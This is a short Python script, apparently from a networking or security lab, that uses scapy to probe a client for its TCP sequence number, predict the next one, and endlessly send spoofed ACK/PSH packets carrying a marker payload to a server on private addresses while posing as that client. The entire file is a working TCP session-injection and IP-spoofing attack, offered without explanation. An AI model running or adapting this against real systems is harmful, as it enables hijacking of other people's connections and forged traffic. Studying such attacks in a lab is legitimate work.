"""
TCP packet injector
NOTE: Requires SUPERUSER privileges to run
"""
# !/usr/bin/env python
from scapy.layers.inet import TCP, IP
from scapy.all import send, sr1
from random import randint

SERVER_SOCK = ('192.168.104.100', 9999)
CLIENT_SOCK = ('192.168.104.142', 53434)


def fetch_guess():
    probe_ip_packet = IP(dst=CLIENT_SOCK[0])
    probe_tcp_packet = TCP(dport=CLIENT_SOCK[1], flags=2, window=1004, seq=12345)
    encapsulated = probe_ip_packet / probe_tcp_packet
    answer = sr1(encapsulated, verbose=False)
    return answer[0].getlayer(TCP).seq


def predict_seq_number():
    ret_seq = fetch_guess()
    guess = ret_seq - 1 + (randint(1, 32) * 1032)
    guess %= 4294967296
    return guess


def main():
    bad_ip_packet = IP(dst=SERVER_SOCK[0], src=CLIENT_SOCK[0])
    # TCP FLAGS ACK + PSH = 24
    bad_tcp_packet = TCP(dport=SERVER_SOCK[1], sport=CLIENT_SOCK[1], flags=24, window=1004)
    encapsulated = bad_ip_packet / bad_tcp_packet / "00000018AM_I_EVIL_YES_I_AM"
    while True:
        encapsulated[TCP].setfieldval('seq', predict_seq_number())
        send(encapsulated, verbose=False)


if __name__ == '__main__':
    main()
